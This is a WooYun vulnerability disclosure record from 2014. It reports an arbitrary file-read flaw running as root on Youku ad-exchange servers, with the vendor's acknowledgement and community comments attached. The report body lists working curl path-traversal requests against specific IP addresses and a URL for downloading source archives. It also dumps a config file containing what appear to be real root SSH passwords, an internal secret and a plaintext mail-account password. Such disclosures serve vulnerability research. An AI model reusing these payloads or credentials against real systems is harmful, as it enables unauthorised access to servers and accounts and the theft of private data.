{"id": 47784, "wybug_id": "wooyun-2014-085445", "wybug_title": "优酷系列服务器文件读取", "wybug_corp": "优酷", "wybug_author": "s0mun5", "wybug_date": "2014-12-01 15:49", "wybug_open_date": "2015-01-15 15:50", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向公众公开  简要描述： 优酷系列服务器文件读取以及内部信息泄露 详细说明：  广告系统的几台服务器都有问题。可以读取任意文件 并且是root权限。\n\n下面是收集到的有问题的几台服务器。\ncurl http://220.181.185.228/../../../../../../../../../etc/sysconfig/network-scripts/ifcfg-eth1curl http://220.181.185.229/../../../../../../../../../etc/sysconfig/network-scripts/ifcfg-eth1curl http://220.181.154.180/../../../../../../../../../etc/sysconfig/network-scripts/ifcfg-eth1curl http://220.181.154.181/../../../../../../../../../etc/sysconfig/network-scripts/ifcfg-eth1curl http://220.181.154.202/../../../../../../../../../etc/sysconfig/network-scripts/ifcfg-eth1curl http://220.181.154.203/../../../../../../../../../etc/sysconfig/network-scripts/ifcfg-eth1\n\n\n   漏洞证明：  以其中一台为例进行延伸。读取shadow\n\n读取history\n\n通过history读取各种配置文件\n\n\n# -*- coding: utf-8 -*-[auctionserver_default]# 安装根目录rundir = /opt/workspace/exchange1.2/auctionserver#模式(prod/dev)mode = \"prod\"#接受请求verticle个数mainCore = 8#与dsp连接的verticle个数beaconCore = 8# 拍卖服务器的域名，用于进行HTTP请求时对Host的验证serverHosts = [\"c.miaozhen.atm.youku.com\",\"b.miaozhen.atm.youku.com\"]# 拍卖服务器的端口port = 80# 对Exchange网站开放的API的端口apiPort = 8080# 默认的曝光监控地址impAddr = \"http://n.miaozhen.atm.youku.com/x.gif\"# 默认的点击监控地址clickAddr = \"http://n.miaozhen.atm.youku.com/r.gif\"# user id在cookie里面的keymzCookieName = \"__ysuid\"# 对DSP的连接池大小，由于多个beacon，其实是乘以beacon个数的clientPoolSize = 100# HTTP pipeline队列的最大长度clientMaxPipelineSize = 200 clientConnectionTimeout = 300serverIdleTimeout = 700# 是否需要服务费needServiceFee = \"false\"# 特殊请求密码secret = \"miaozhen1234\"isNoticeInPm = \"true\"# 是否检查domain，优先于网站中的配置isCheckDomain = \"true\"isCheckHost = \"false\"isCheckToken = \"false\"token = \"testToken\"#优酷的特殊功能开关isYouku = \"true\"useIPsClient = \"true\"#dmpisDMP = \"false\"dmpHost = \"127.0.0.1\"dmpPort = 6379dmpKey = \"YK_\"dmpSep = \",\"# Exchange网站的地址websiteHost = \"miaozhen.atm.youku.com\"websitePort = 80websiteIps = [\"220.181.154.177\", \"123.126.99.87\", \"10.103.255.174\"]websiteHeaderHost = \"miaozhen.atm.youku.com\"# 注册接口，不需要修改registerApi = \"/server/api/addAuction\"# 预算请求接口，不需要修改budgetApi = \"/pull/api/budget/take\"# 拍卖日志输出的Redis的地址，默认本地redisHost = \"127.0.0.1\"redisPort = 6379keyBudget = \"exchange_auction_budget_backup\"# 输出日志的根目录auctionDataDir = \"/opt/data/backup/exchange1.2/auctionserver\"# 是否显示系统日志isShowLog = \"true\"# 保留日志天数logReservedDays = 30mappingRMUrl = \"\"budgetPort=8281budgetHost=\"miaozhen.atm.youku.com\"mappingDmpPort=6380mappingDmpHost=\"\"mappingDspQps=1mappingDspUrl=\"\"mappingDspId=\"\"forwardPath = \"/\"forwardPort = 1234forwardHost = \"127.0.0.1\"isForward = \"false\"heapSize = 10#启动和停止相关脚本start = bash bin/start.shstop = bash bin/stop.shcheck = bash bin/check.shrestart = bash bin/restart.shstart_retry = bash bin/start_retry.shstop_retry = bash bin/stop_retry.shbackup = bash bin/backup.sh#安装的目标机器密码#sshpass = \"123456\"#安装的目标机器端口sshport = \"1111\"[auctionserver_01]#安装的目标机器用户和域名（ip）node = root@220.181.154.180sshpass = \"ocf(*XzhWt4K\"# 拍卖服务器的名字serverName = \"a05.exchange.ad.b28.youku\"[auctionserver_02]#安装的目标机器用户和域名（ip）node = root@220.181.154.181sshpass = \"isC*&7cjpZCW\"# 拍卖服务器的名字serverName = \"a06.exchange.ad.b28.youku\"#[auctionserver_03]##安装的目标机器用户和域名（ip）#node = root@220.181.154.183#sshpass = \"wzxJ^#jsQJKv\"## 拍卖服务器的名字#serverName = \"a08.exchange.ad.b28.youku\"\n列出几个关键文件地址，不截图证明。\n/opt/workspace/exchange1.2/reportserver/run/start.sh/opt/workspace/exchange1.2/reportserver/code/CMakeLists.txt /opt/workspace/exchange1.2/reportserver/config/mergelog.list/opt/workspace/exchange1.2/reportserver/config/reportserver.cfg/opt/workspace/exchange1.2/auctionserver/conf/exchange_auction_youku_new_config.ini/opt/workspace/exchange1.2/auctionserver/conf/exchange_auction_youku_config.ini/opt/workspace/exchange1.2/auctionserver/conf/dsps.txt /home/zczhao/warn/sendlog.perl/opt/workspace/exchange1.2/thirdparts/redis-2.4.17/redis.conf/home/zczhao/cron/reporttab0 2 * * * /home/zczhao/clear/clear_log.sh0 2 * * * /home/zczhao/clear/clear_bz2.sh0 2 * * * /home/zczhao/clear/bz2_day.sh >> /home/zczhao/clear/history.log#*/10 * * * * /home/zczhao/warn/disk_warn.sh*/10 * * * * bash /opt/workspace/exchange1.2/auctionserver/bin/run_dnscache.sh*/10 * * * * bash /opt/workspace/exchange1.2/auctionserver/bin/heartbeat_check.sh*/10 * * * * bash /opt/workspace/exchange1.2/auctionserver/bin/jmap.sh/opt/data/backup/exchange1.2/reportserver/auction/log/bz2.sh\n其中sendlog.perl中有一个内部邮箱账号\nmy $mail_smtp    = 'mail.youku.com';my $mail_from    = 'systeminformation@youku.com';my $mail_to      = 'dawei.zhang@youku.com';my $auth_id      = 'systeminformation';my $auth_passwd  = '111aaaAAA';my $subject      = \"Warn from adExchange13 ($date).\";my $body         = `cat /home/zczhao/warn/warn_log`;\n\n\n对了，还可以下载源码。http://220.181.185.228/../../../../../../../../opt/workspace/exchange1.2/auctionserver.2014-07-16-07-52-30.tar.gz   修复方案：     版权声明：转载请注明来源 s0mun5@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-12-01 16:14 厂商回复： 多谢提醒，马上修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-01 15:53 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  mark    \n     2014-12-01 15:58 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  通用？    \n     2014-12-01 16:10 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  闪电呢？    \n     2014-12-01 16:17 |    \t\ts0mun5  \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:24        | .)\t\t \n  @px1624 哪能天天闪电    \n     2014-12-01 16:27 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  优酷确认速度真快    \n     2014-12-01 16:49 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @s0mun5 可惜了，6连闪，断到这个漏洞上了，你应该匿名发    \n     2014-12-01 16:49 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  20Rank ，关注下    \n     2014-12-02 17:12 |    \t\tAnonymous \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:30        | 园长是大傻逼)\t\t \n  混个脸熟 可以加QQ 5737796吗    \n     2015-01-03 20:52 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  为什么会这样？    \n     2015-01-15 16:13 |    \t\tc4bbage \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:7        | var_dump($me);)\t\t \n  还真存在这样的漏洞。    \n     2015-01-15 16:29 |    \t\tgreg.wu \t\t\t( 普通白帽子  |\t\t\t        Rank:815 漏洞数:99        | 打酱油的~)\t\t \n  这不科学啊，url怎么解析的，是什么web服务器？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}